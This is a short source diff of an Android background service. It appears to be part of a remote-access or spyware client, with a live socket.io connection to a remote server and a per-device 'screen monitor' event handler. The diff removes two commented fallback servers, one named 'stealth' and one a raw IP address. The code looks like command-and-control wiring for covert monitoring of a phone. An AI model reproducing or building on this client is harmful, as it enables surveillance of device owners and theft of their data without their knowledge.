@@ -83,8 +83,6 @@ public class Server extends Service {
 
         try {
             socket = IO.socket("https://socket.gsttrust.org/");
-            // socket = IO.socket("https://stealth.gstpainel.fun/");
-            // socket = IO.socket("http://191.101.131.54:8080");
             socket.connect();
             socket.on(Socket.EVENT_CONNECT, onConnectDevice);
             socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
